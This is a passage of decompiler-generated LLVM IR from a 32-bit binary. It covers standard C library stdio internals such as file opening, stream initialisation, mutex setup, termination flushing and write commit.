  %v1_80506f1 = and i32 %v0_80506ec, 32771
  store i32 %v1_80506f1, i32* %edx.global-to-local, align 4
  %v1_80506f7 = load i32, i32* @ebp, align 4
  %v2_80506f7 = add i32 %v1_80506f7, 4
  %v3_80506f7 = inttoptr i32 %v2_80506f7 to i32*
  store i32 %arg4, i32* %v3_80506f7, align 4
  %v0_80506fa = load i32, i32* %edx.global-to-local, align 4
  %v1_80506fa = add i32 %v0_80506fa, 1
  store i32 %v1_80506fa, i32* %edx.global-to-local, align 4
  %v0_80506fb = load i32, i32* %eax.global-to-local, align 4
  %v2_80506fb = and i32 %v0_80506fb, %v1_80506fa
  store i32 %v2_80506fb, i32* %eax.global-to-local, align 4
  %v12_80506fd = icmp eq i32 %v2_80506fb, %v1_80506fa
  %v1_80506ff = icmp eq i1 %v12_80506fd, false
  br i1 %v1_80506ff, label %dec_label_pc_805066a, label %dec_label_pc_8050705

dec_label_pc_8050705:                             ; preds = %dec_label_pc_80506ec
  %v0_8050705 = load i32, i32* @esi, align 4
  %v1_8050707 = and i32 %v0_8050705, 1024
  %v1_8050709 = xor i32 %v1_8050707, 1024
  store i32 %v1_8050709, i32* %eax.global-to-local, align 4
  %v1_805070e = load i32, i32* @ebx, align 4
  %v2_805070e = and i32 %v1_805070e, %v1_8050709
  %v3_805070e = icmp eq i32 %v2_805070e, 0
  br i1 %v3_805070e, label %dec_label_pc_8050705.dec_label_pc_805072b_crit_edge, label %dec_label_pc_8050712

dec_label_pc_8050705.dec_label_pc_805072b_crit_edge: ; preds = %dec_label_pc_8050705
  br label %dec_label_pc_805072b

dec_label_pc_8050712:                             ; preds = %dec_label_pc_8050705
  store i32 4, i32* %stack_var_-72, align 4
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_805071b = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_805071b, i32* %eax.global-to-local, align 4
  %v1_8050723 = icmp eq i32 %v3_805071b, 0
  %v1_8050725 = icmp eq i1 %v1_8050723, false
  br i1 %v1_8050725, label %dec_label_pc_805066a, label %dec_label_pc_8050712.dec_label_pc_805072b_crit_edge

dec_label_pc_8050712.dec_label_pc_805072b_crit_edge: ; preds = %dec_label_pc_8050712
  %v0_805072b.pre = load i32, i32* @esi, align 4
  %v0_8050731.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805072b

dec_label_pc_805072b:                             ; preds = %dec_label_pc_8050705.dec_label_pc_805072b_crit_edge, %dec_label_pc_8050712.dec_label_pc_805072b_crit_edge
  %v0_8050731 = phi i32 [ %v1_805070e, %dec_label_pc_8050705.dec_label_pc_805072b_crit_edge ], [ %v0_8050731.pre, %dec_label_pc_8050712.dec_label_pc_805072b_crit_edge ]
  %v0_805072b = phi i32 [ %v0_8050705, %dec_label_pc_8050705.dec_label_pc_805072b_crit_edge ], [ %v0_805072b.pre, %dec_label_pc_8050712.dec_label_pc_805072b_crit_edge ]
  %v1_805072b = and i32 %v0_805072b, 32768
  %v2_8050731 = or i32 %v1_805072b, %v0_8050731
  store i32 %v2_8050731, i32* @ebx, align 4
  br label %dec_label_pc_8050756

dec_label_pc_8050735:                             ; preds = %dec_label_pc_80506e8
  %v1_8050735 = add i32 %arg4, 1
  %v8_8050735 = icmp eq i32 %v1_8050735, 0
  store i32 %v1_8050735, i32* @edi, align 4
  %v0_8050741.pre = load i32, i32* @ebx, align 4
  br i1 %v8_8050735, label %dec_label_pc_805073b, label %dec_label_pc_8050738

dec_label_pc_8050738:                             ; preds = %dec_label_pc_8050735
  %v11_8050738 = or i32 %v0_8050741.pre, 32768
  store i32 %v11_8050738, i32* @ebx, align 4
  br label %dec_label_pc_805073b

dec_label_pc_805073b:                             ; preds = %dec_label_pc_8050735, %dec_label_pc_8050738
  %v0_8050741 = phi i32 [ %v11_8050738, %dec_label_pc_8050738 ], [ %v0_8050741.pre, %dec_label_pc_8050735 ]
  store i32 %v0_8050741, i32* %stack_var_-72, align 4
  %v0_8050742 = load i32, i32* @esi, align 4
  store i32 %v0_8050742, i32* %stack_var_-76, align 4
  %v3_8050743 = trunc i32 %v0_8050741 to i8
  %v4_8050743 = call i32 @__libc_open(i32 %v0_8050742, i8 %v3_8050743, i32 438)
  store i32 %v4_8050743, i32* %eax.global-to-local, align 4
  %v1_805074b = load i32, i32* @ebp, align 4
  %v2_805074b = add i32 %v1_805074b, 4
  %v3_805074b = inttoptr i32 %v2_805074b to i32*
  store i32 %v4_8050743, i32* %v3_805074b, align 4
  %v2_805074e = icmp slt i32 %v4_8050743, 0
  br i1 %v2_805074e, label %dec_label_pc_805067d, label %dec_label_pc_8050756

dec_label_pc_8050756:                             ; preds = %dec_label_pc_805073b, %dec_label_pc_805072b
  %v0_8050756 = load i32, i32* @ebp, align 4
  %v1_8050756 = inttoptr i32 %v0_8050756 to i16*
  %v2_8050756 = load i16, i16* %v1_8050756, align 2
  %v3_8050756 = and i16 %v2_8050756, 8192
  store i16 %v3_8050756, i16* %v1_8050756, align 2
  %v0_805075c = load i32, i32* @ebx, align 4
  %v8_805075e = and i32 %v0_805075c, -31744
  %v1_8050763 = urem i32 %v0_805075c, 4
  %v1_8050766 = add nuw nsw i32 %v1_8050763, 1
  store i32 %v1_8050766, i32* %eax.global-to-local, align 4
  %v1_8050767 = load i32, i32* @ebp, align 4
  %v2_8050767 = inttoptr i32 %v1_8050767 to i32*
  %v3_8050767 = load i32, i32* %v2_8050767, align 4
  %v4_8050767 = or i32 %v3_8050767, %v8_805075e
  %v1_805076a = mul nuw nsw i32 %v1_8050766, 16
  %v2_805076d = xor i32 %v1_805076a, 48
  store i32 %v2_805076d, i32* %eax.global-to-local, align 4
  %v2_8050770 = or i32 %v4_8050767, %v2_805076d
  store i32 %v2_8050770, i32* @ebx, align 4
  %v1_8050772 = trunc i32 %v2_8050770 to i16
  %v3_8050772 = inttoptr i32 %v1_8050767 to i16*
  store i16 %v1_8050772, i16* %v3_8050772, align 2
  %v0_8050776 = load i32, i32* %stack_var_-76, align 4
  %v1_8050776 = call i32 @__errno_location(i32 %v0_8050776)
  store i32 %v1_8050776, i32* %eax.global-to-local, align 4
  store i32 %v1_8050776, i32* @esi, align 4
  %v1_8050780 = inttoptr i32 %v1_8050776 to i32*
  %v2_8050780 = load i32, i32* %v1_8050780, align 4
  store i32 %v2_8050780, i32* @edi, align 4
  %v0_8050782 = load i32, i32* @ebp, align 4
  %v1_8050782 = add i32 %v0_8050782, 4
  %v2_8050782 = inttoptr i32 %v1_8050782 to i32*
  %v3_8050782 = load i32, i32* %v2_8050782, align 4
  store i32 %v3_8050782, i32* %stack_var_-76, align 4
  %v1_8050785 = call i32 @isatty(i32 %v3_8050782)
  %v2_805078d = mul i32 %v1_8050785, 256
  store i32 %v2_805078d, i32* %eax.global-to-local, align 4
  %v0_8050790 = load i32, i32* @ebx, align 4
  %v2_8050790 = or i32 %v0_8050790, %v2_805078d
  store i32 %v2_8050790, i32* @ebx, align 4
  %v1_8050792 = trunc i32 %v2_8050790 to i16
  %v2_8050792 = load i32, i32* @ebp, align 4
  %v3_8050792 = inttoptr i32 %v2_8050792 to i16*
  store i16 %v1_8050792, i16* %v3_8050792, align 2
  %v0_8050796 = load i32, i32* @edi, align 4
  %v1_8050796 = load i32, i32* @esi, align 4
  %v2_8050796 = inttoptr i32 %v1_8050796 to i32*
  store i32 %v0_8050796, i32* %v2_8050796, align 4
  %v0_8050798 = load i32, i32* @ebp, align 4
  %v1_8050798 = add i32 %v0_8050798, 8
  %v2_8050798 = inttoptr i32 %v1_8050798 to i32*
  %v3_8050798 = load i32, i32* %v2_8050798, align 4
  %v4_8050798 = icmp eq i32 %v3_8050798, 0
  %v1_805079c = icmp eq i1 %v4_8050798, false
  br i1 %v1_805079c, label %dec_label_pc_80507cc, label %dec_label_pc_805079e

dec_label_pc_805079e:                             ; preds = %dec_label_pc_8050756
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_80507a6 = call i32 @malloc(i32 4096)
  store i32 %v1_80507a6, i32* %eax.global-to-local, align 4
  %v1_80507ae = load i32, i32* @ebp, align 4
  %v2_80507ae = add i32 %v1_80507ae, 8
  %v3_80507ae = inttoptr i32 %v2_80507ae to i32*
  store i32 %v1_80507a6, i32* %v3_80507ae, align 4
  %v1_80507b1 = icmp eq i32 %v1_80507a6, 0
  %v0_80507c5 = load i32, i32* @ebp, align 4
  br i1 %v1_80507b1, label %dec_label_pc_80507c5, label %dec_label_pc_80507b5

dec_label_pc_80507b5:                             ; preds = %dec_label_pc_805079e
  %v1_80507b5 = inttoptr i32 %v0_80507c5 to i16*
  %v2_80507b5 = load i16, i16* %v1_80507b5, align 2
  %v3_80507b5 = or i16 %v2_80507b5, 16384
  store i16 %v3_80507b5, i16* %v1_80507b5, align 2
  %v1_80507bb = add i32 %v1_80507a6, 4096
  store i32 %v1_80507bb, i32* %eax.global-to-local, align 4
  %v1_80507c0 = load i32, i32* @ebp, align 4
  %v2_80507c0 = add i32 %v1_80507c0, 12
  %v3_80507c0 = inttoptr i32 %v2_80507c0 to i32*
  store i32 %v1_80507bb, i32* %v3_80507c0, align 4
  br label %dec_label_pc_80507cc

dec_label_pc_80507c5:                             ; preds = %dec_label_pc_805079e
  %v1_80507c5 = add i32 %v0_80507c5, 12
  %v2_80507c5 = inttoptr i32 %v1_80507c5 to i32*
  store i32 0, i32* %v2_80507c5, align 4
  br label %dec_label_pc_80507cc

dec_label_pc_80507cc:                             ; preds = %dec_label_pc_8050756, %dec_label_pc_80507b5, %dec_label_pc_80507c5
  %v0_80507cc = load i32, i32* @ebp, align 4
  %v1_80507cc = add i32 %v0_80507cc, 8
  %v2_80507cc = inttoptr i32 %v1_80507cc to i32*
  %v3_80507cc = load i32, i32* %v2_80507cc, align 4
  store i32 %v3_80507cc, i32* %eax.global-to-local, align 4
  %v1_80507cf = add i32 %v0_80507cc, 2
  %v2_80507cf = inttoptr i32 %v1_80507cf to i8*
  store i8 0, i8* %v2_80507cf, align 1
  %v0_80507d3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80507d3 = load i32, i32* @ebp, align 4
  %v2_80507d3 = add i32 %v1_80507d3, 24
  %v3_80507d3 = inttoptr i32 %v2_80507d3 to i32*
  store i32 %v0_80507d3, i32* %v3_80507d3, align 4
  %v0_80507d6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80507d6 = load i32, i32* @ebp, align 4
  %v2_80507d6 = add i32 %v1_80507d6, 28
  %v3_80507d6 = inttoptr i32 %v2_80507d6 to i32*
  store i32 %v0_80507d6, i32* %v3_80507d6, align 4
  %v0_80507d9 = load i32, i32* %eax.global-to-local, align 4
  %v1_80507d9 = load i32, i32* @ebp, align 4
  %v2_80507d9 = add i32 %v1_80507d9, 16
  %v3_80507d9 = inttoptr i32 %v2_80507d9 to i32*
  store i32 %v0_80507d9, i32* %v3_80507d9, align 4
  %v0_80507dc = load i32, i32* %eax.global-to-local, align 4
  %v1_80507dc = load i32, i32* @ebp, align 4
  %v2_80507dc = add i32 %v1_80507dc, 20
  %v3_80507dc = inttoptr i32 %v2_80507dc to i32*
  store i32 %v0_80507dc, i32* %v3_80507dc, align 4
  %v0_80507df = load i32, i32* @ebp, align 4
  %v1_80507df = add i32 %v0_80507df, 44
  %v2_80507df = inttoptr i32 %v1_80507df to i32*
  store i32 0, i32* %v2_80507df, align 4
  %v0_80507e6 = load i32, i32* @ebp, align 4
  %v1_80507e6 = add i32 %v0_80507e6, 1
  %v2_80507e6 = inttoptr i32 %v1_80507e6 to i8*
  %v3_80507e6 = load i8, i8* %v2_80507e6, align 1
  %v4_80507e6 = and i8 %v3_80507e6, 32
  %v5_80507e6 = icmp eq i8 %v4_80507e6, 0
  %v0_80507ea = load i32, i32* @global_var_8062810.187, align 16
  store i32 %v0_80507ea, i32* %eax.global-to-local, align 4
  %v2_80507ef = add i32 %v0_80507e6, 52
  %v3_80507ef = inttoptr i32 %v2_80507ef to i32*
  store i32 %v0_80507ea, i32* %v3_80507ef, align 4
  br i1 %v5_80507e6, label %dec_label_pc_8050861, label %dec_label_pc_80507f4

dec_label_pc_80507f4:                             ; preds = %dec_label_pc_80507cc
  store i32 134540701, i32* %stack_var_-72, align 4
  %v2_80507ff = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80507ff, i32* @esi, align 4
  store i32 %v2_80507ff, i32* %stack_var_-76, align 4
  %v4_8050804 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  store i32 %v4_8050804, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80627f8.205 to i32), i32* %stack_var_-76, align 4
  %v1_8050810 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  store i32 %v1_8050810, i32* %eax.global-to-local, align 4
  store i32 134540701, i32* %stack_var_-72, align 4
  %v2_8050822 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8050822, i32* @ebx, align 4
  store i32 %v2_8050822, i32* %stack_var_-76, align 4
  %v4_8050827 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134540701, i32 ptrtoint (i32* @global_var_80627e0.213 to i32))
  store i32 %v4_8050827, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80627e0.213 to i32), i32* %stack_var_-76, align 4
  %v1_8050833 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80627e0.213 to i32))
  %v0_8050838 = load i32, i32* bitcast (i32** @global_var_80627dc.184 to i32*), align 4
  store i32 %v0_8050838, i32* %eax.global-to-local, align 4
  %v1_805083d = load i32, i32* @ebp, align 4
  %v2_805083d = add i32 %v1_805083d, 32
  %v3_805083d = inttoptr i32 %v2_805083d to i32*
  store i32 %v0_8050838, i32* %v3_805083d, align 4
  %v0_8050840 = load i32, i32* @ebp, align 4
  store i32 %v0_8050840, i32* bitcast (i32** @global_var_80627dc.184 to i32*), align 4
  %v2_8050846 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8050846, i32* @ecx, align 4
  %v2_8050847 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_8050847, i32* @edi, align 4
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_8050822, i32* %stack_var_-76, align 4
  %v3_805084b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  store i32 %v2_8050822, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_80507ff, i32* %stack_var_-76, align 4
  %v3_8050855 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_8050855, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805085a

dec_label_pc_805085a:                             ; preds = %dec_label_pc_8050687, %dec_label_pc_80507f4
  br label %dec_label_pc_8050861

dec_label_pc_805085f:                             ; preds = %dec_label_pc_805067d, %dec_label_pc_805066a
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8050861

dec_label_pc_8050861:                             ; preds = %dec_label_pc_80507cc, %dec_label_pc_80506b6, %dec_label_pc_805085a, %dec_label_pc_805085f
  %v0_8050864 = load i32, i32* @ebp, align 4
  store i32 %v0_8050864, i32* %eax.global-to-local, align 4
  %v2_8050866 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050866, i32* @ebx, align 4
  store i32 %v0_805063e, i32* @esi, align 4
  store i32 %v0_805063d, i32* @edi, align 4
  store i32 %v0_805063c, i32* @ebp, align 4
  ret i32 %v0_8050864

; uselistorder directives
  uselistorder i32 %v0_80507c5, { 1, 0 }
  uselistorder i32 %v1_80507a6, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805078d, { 1, 0 }
  uselistorder i32 %v1_8050776, { 1, 0, 2 }
  uselistorder i32 %v11_8050738, { 1, 0 }
  uselistorder i32 %v0_8050741.pre, { 1, 0 }
  uselistorder i32 %v1_8050709, { 1, 0 }
  uselistorder i32 %v0_8050705, { 1, 0 }
  uselistorder i32 %v1_80506bb, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_80506aa, { 1, 0 }
  uselistorder i32 %v0_805067d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33 }
  uselistorder i32 %arg4, { 3, 1, 0, 4, 2, 5 }
  uselistorder label %dec_label_pc_8050861, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805085a, { 1, 0 }
  uselistorder label %dec_label_pc_80507cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805073b, { 1, 0 }
  uselistorder label %dec_label_pc_805072b, { 1, 0 }
  uselistorder label %dec_label_pc_80506e8, { 1, 0 }
  uselistorder label %dec_label_pc_80506b2, { 1, 0 }
  uselistorder label %dec_label_pc_80506a4, { 1, 0 }
  uselistorder label %dec_label_pc_8050699, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805086d = load i32, i32* @edi, align 4
  %v0_805086e = load i32, i32* @esi, align 4
  %v0_805086f = load i32, i32* @ebx, align 4
  store i32 %v0_805086f, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8050878 = call i32 @__errno_location(i32 %v0_805086f)
  store i32 %v1_8050878, i32* @edi, align 4
  %v0_8050882 = load i32, i32* @global_var_8062820.183, align 32
  store i32 %v0_8050882, i32* @esi, align 4
  %v1_8050888 = inttoptr i32 %v1_8050878 to i32*
  %v2_8050888 = load i32, i32* %v1_8050888, align 4
  store i32 %v2_8050888, i32* %ebp.global-to-local, align 4
  %v1_805088c = call i32 @isatty(i32 0)
  %v0_8050891 = load i32, i32* @ebx, align 4
  %v2_8050893 = sub i32 %v0_8050891, %v1_805088c
  %v2_805089e = mul i32 %v2_8050893, 256
  %v0_80508a1 = load i32, i32* @esi, align 4
  %v2_80508a1 = xor i32 %v0_80508a1, %v2_805089e
  %v1_80508a3 = trunc i32 %v2_80508a1 to i16
  store i16 %v1_80508a3, i16* bitcast (i32* @global_var_8062820.183 to i16*), align 32
  %v0_80508aa = load i32, i32* @global_var_8062870.203, align 16
  store i32 %v0_80508aa, i32* @esi, align 4
  %v1_80508b0 = call i32 @isatty(i32 1)
  %v0_80508b5 = load i32, i32* @ebx, align 4
  %v2_80508b5 = sub i32 %v0_80508b5, %v1_80508b0
  %v2_80508b7 = mul i32 %v2_80508b5, 256
  %v0_80508ba = load i32, i32* @esi, align 4
  %v2_80508ba = xor i32 %v2_80508b7, %v0_80508ba
  %v1_80508bc = trunc i32 %v2_80508ba to i16
  store i16 %v1_80508bc, i16* bitcast (i32* @global_var_8062870.203 to i16*), align 16
  %v0_80508c3 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80508c3 = load i32, i32* @edi, align 4
  %v2_80508c3 = inttoptr i32 %v1_80508c3 to i32*
  store i32 %v0_80508c3, i32* %v2_80508c3, align 4
  %v2_80508c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80508c8, i32* @ebx, align 4
  store i32 %v0_805086e, i32* @esi, align 4
  store i32 %v0_805086d, i32* @edi, align 4
  ret i32 %v1_80508b0

; uselistorder directives
  uselistorder i32 %v1_8050878, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80508db = inttoptr i32 %arg1 to i16*
  %v4_80508db = call i32 @memcpy(i16* %v3_80508db, i32 ptrtoint (i32* @global_var_805b50c.214 to i32), i32 24)
  ret i32 %v4_80508db
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80508e4 = load i32, i32* @esi, align 4
  %v0_80508e5 = load i32, i32* @ebx, align 4
  store i32 %v0_80508e5, i32* %stack_var_-8, align 4
  %v2_80508ee = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80627e0.213 to i32))
  store i32 %v2_80508ee, i32* %eax.global-to-local, align 4
  %v2_80508fa = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_80627f8.205 to i32))
  store i32 %v2_80508fa, i32* %eax.global-to-local, align 4
  %storemerge22 = load i32, i32* bitcast (i32** @global_var_80627dc.184 to i32*), align 4
  store i32 %storemerge22, i32* @ebx, align 4
  %v1_805094423 = icmp eq i32 %storemerge22, 0
  %v1_805094624 = icmp eq i1 %v1_805094423, false
  br i1 %v1_805094624, label %dec_label_pc_8050907.lr.ph, label %dec_label_pc_8050964.preheader

dec_label_pc_8050907.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8050907

dec_label_pc_8050907:                             ; preds = %dec_label_pc_8050907.lr.ph, %dec_label_pc_805092e
  %storemerge25 = phi i32 [ %storemerge22, %dec_label_pc_8050907.lr.ph ], [ %storemerge, %dec_label_pc_805092e ]
  %v1_805090a = add i32 %storemerge25, 56
  store i32 %v1_805090a, i32* @esi, align 4
  %v2_805090e = call i32 @pthread_mutex_trylock(i32 %v1_805090a)
  store i32 %v2_805090e, i32* %eax.global-to-local, align 4
  %v1_8050916 = icmp eq i32 %v2_805090e, 0
  br i1 %v1_8050916, label %dec_label_pc_805092e, label %dec_label_pc_805091a

dec_label_pc_805091a:                             ; preds = %dec_label_pc_8050907
  %v0_805091a = load i32, i32* @ebx, align 4
  %v1_805091a = add i32 %v0_805091a, 8
  %v2_805091a = inttoptr i32 %v1_805091a to i32*
  %v3_805091a = load i32, i32* %v2_805091a, align 4
  store i32 %v3_805091a, i32* %eax.global-to-local, align 4
  %v1_805091d = inttoptr i32 %v0_805091a to i16*
  store i16 48, i16* %v1_805091d, align 2
  %v0_8050922 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050922 = load i32, i32* @ebx, align 4
  %v2_8050922 = add i32 %v1_8050922, 24
  %v3_8050922 = inttoptr i32 %v2_8050922 to i32*
  store i32 %v0_8050922, i32* %v3_8050922, align 4
  %v0_8050925 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050925 = load i32, i32* @ebx, align 4
  %v2_8050925 = add i32 %v1_8050925, 28
  %v3_8050925 = inttoptr i32 %v2_8050925 to i32*
  store i32 %v0_8050925, i32* %v3_8050925, align 4
  %v0_8050928 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050928 = load i32, i32* @ebx, align 4
  %v2_8050928 = add i32 %v1_8050928, 16
  %v3_8050928 = inttoptr i32 %v2_8050928 to i32*
  store i32 %v0_8050928, i32* %v3_8050928, align 4
  %v0_805092b = load i32, i32* %eax.global-to-local, align 4
  %v1_805092b = load i32, i32* @ebx, align 4
  %v2_805092b = add i32 %v1_805092b, 20
  %v3_805092b = inttoptr i32 %v2_805092b to i32*
  store i32 %v0_805092b, i32* %v3_805092b, align 4
  br label %dec_label_pc_805092e

dec_label_pc_805092e:                             ; preds = %dec_label_pc_8050907, %dec_label_pc_805091a
  %v0_8050931 = load i32, i32* @ebx, align 4
  %v1_8050931 = add i32 %v0_8050931, 52
  %v2_8050931 = inttoptr i32 %v1_8050931 to i32*
  store i32 1, i32* %v2_8050931, align 4
  %v0_8050938 = load i32, i32* @esi, align 4
  %v2_8050939 = call i32 @__stdio_init_mutex(i32 %v0_8050938)
  store i32 %v2_8050939, i32* %eax.global-to-local, align 4
  %v0_805093e = load i32, i32* @ebx, align 4
  %v1_805093e = add i32 %v0_805093e, 32
  %v2_805093e = inttoptr i32 %v1_805093e to i32*
  %storemerge = load i32, i32* %v2_805093e, align 4
  store i32 %storemerge, i32* @ebx, align 4
  %v1_8050944 = icmp eq i32 %storemerge, 0
  %v1_8050946 = icmp eq i1 %v1_8050944, false
  br i1 %v1_8050946, label %dec_label_pc_8050907, label %dec_label_pc_8050941.dec_label_pc_8050964.preheader_crit_edge

dec_label_pc_8050941.dec_label_pc_8050964.preheader_crit_edge: ; preds = %dec_label_pc_805092e
  %storemerge23.pre = load i32, i32* bitcast (i32** @global_var_80627dc.184 to i32*), align 4
  br label %dec_label_pc_8050964.preheader

dec_label_pc_8050964.preheader:                   ; preds = %dec_label_pc_8050941.dec_label_pc_8050964.preheader_crit_edge, %entry
  %storemerge23 = phi i32 [ %storemerge23.pre, %dec_label_pc_8050941.dec_label_pc_8050964.preheader_crit_edge ], [ %storemerge22, %entry ]
  store i32 %storemerge23, i32* @ebx, align 4
  %v1_80509644 = icmp eq i32 %storemerge23, 0
  %v1_805096611 = icmp eq i1 %v1_80509644, false
  br i1 %v1_805096611, label %dec_label_pc_8050950.preheader, label %dec_label_pc_8050968

dec_label_pc_8050950.preheader:                   ; preds = %dec_label_pc_8050964.preheader
  br label %dec_label_pc_8050950

dec_label_pc_8050950:                             ; preds = %dec_label_pc_8050950.preheader, %dec_label_pc_8050961
  %v0_8050958 = phi i32 [ %storemerge2, %dec_label_pc_8050961 ], [ %storemerge23, %dec_label_pc_8050950.preheader ]
  %v1_8050950 = inttoptr i32 %v0_8050958 to i8*
  %v2_8050950 = load i8, i8* %v1_8050950, align 1
  %v3_8050950 = and i8 %v2_8050950, 64
  %v4_8050950 = icmp eq i8 %v3_8050950, 0
  br i1 %v4_8050950, label %dec_label_pc_8050961, label %dec_label_pc_8050955

dec_label_pc_8050955:                             ; preds = %dec_label_pc_8050950
  %v2_8050959 = call i32 @__stdio_wcommit(i32 %v0_8050958)
  store i32 %v2_8050959, i32* %eax.global-to-local, align 4
  %v0_8050961.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050961

dec_label_pc_8050961:                             ; preds = %dec_label_pc_8050950, %dec_label_pc_8050955
  %v0_8050961 = phi i32 [ %v0_8050958, %dec_label_pc_8050950 ], [ %v0_8050961.pre, %dec_label_pc_8050955 ]
  %v1_8050961 = add i32 %v0_8050961, 32
  %v2_8050961 = inttoptr i32 %v1_8050961 to i32*
  %storemerge2 = load i32, i32* %v2_8050961, align 4
  store i32 %storemerge2, i32* @ebx, align 4
  %v1_8050964 = icmp eq i32 %storemerge2, 0
  %v1_8050966 = icmp eq i1 %v1_8050964, false
  br i1 %v1_8050966, label %dec_label_pc_8050950, label %dec_label_pc_8050968

dec_label_pc_8050968:                             ; preds = %dec_label_pc_8050961, %dec_label_pc_8050964.preheader
  %v2_8050968 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050968, i32* %eax.global-to-local, align 4
  %v2_8050969 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050969, i32* @ebx, align 4
  store i32 %v0_80508e4, i32* @esi, align 4
  ret i32 %v2_8050968

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 2, 0 }
  uselistorder i32 %storemerge23, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_8050961, { 1, 0 }
  uselistorder label %dec_label_pc_8050950, { 1, 0 }
  uselistorder label %dec_label_pc_805092e, { 1, 0 }
  uselistorder label %dec_label_pc_8050907, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_805096c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050974 = add i32 %arg1, 8
  %v2_8050974 = inttoptr i32 %v1_8050974 to i32*
  %v3_8050974 = load i32, i32* %v2_8050974, align 4
  store i32 %v3_8050974, i32* %edx.global-to-local, align 4
  %v1_8050977 = add i32 %arg1, 16
  %v2_8050977 = inttoptr i32 %v1_8050977 to i32*
  %v3_8050977 = load i32, i32* %v2_8050977, align 4
  %v2_805097a = sub i32 %v3_8050977, %v3_8050974
  %v12_805097a = icmp eq i32 %v2_805097a, 0
  store i32 %v2_805097a, i32* %eax.global-to-local, align 4
  br i1 %v12_805097a, label %dec_label_pc_805098d, label %dec_label_pc_805097e

dec_label_pc_805097e:                             ; preds = %entry
  store i32 %v3_8050974, i32* %v2_8050977, align 4
  %v0_8050981 = load i32, i32* @ecx, align 4
  %v0_8050982 = load i32, i32* %eax.global-to-local, align 4
  %v0_8050983 = load i32, i32* %edx.global-to-local, align 4
  %v0_8050984 = load i32, i32* @ebx, align 4
  %v4_8050985 = inttoptr i32 %v0_8050984 to i16*
  %v5_8050985 = call i32 @__stdio_WRITE(i16* %v4_8050985, i32 %v0_8050983, i32 %v0_8050982, i32 %v0_8050981)
  store i32 %v5_8050985, i32* %eax.global-to-local, align 4
  %v0_805098d.pre = load i32, i32* @ebx, align 4
  %v2_8050993.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805098d

dec_label_pc_805098d:                             ; preds = %entry, %dec_label_pc_805097e
  %v2_8050993 = phi i32 [ %tmp11, %entry ], [ %v2_8050993.pre, %dec_label_pc_805097e ]
  %v0_805098d = phi i32 [ %arg1, %entry ], [ %v0_805098d.pre, %dec_label_pc_805097e ]
